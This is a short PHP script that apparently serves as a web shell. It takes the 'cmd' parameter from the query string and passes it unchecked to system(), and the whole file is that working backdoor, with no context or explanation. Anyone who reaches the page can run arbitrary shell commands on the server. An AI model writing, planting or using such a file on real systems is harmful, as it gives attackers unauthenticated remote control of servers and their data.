<?php
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    system($cmd);
} else {
    echo "No command received.";
}
?>
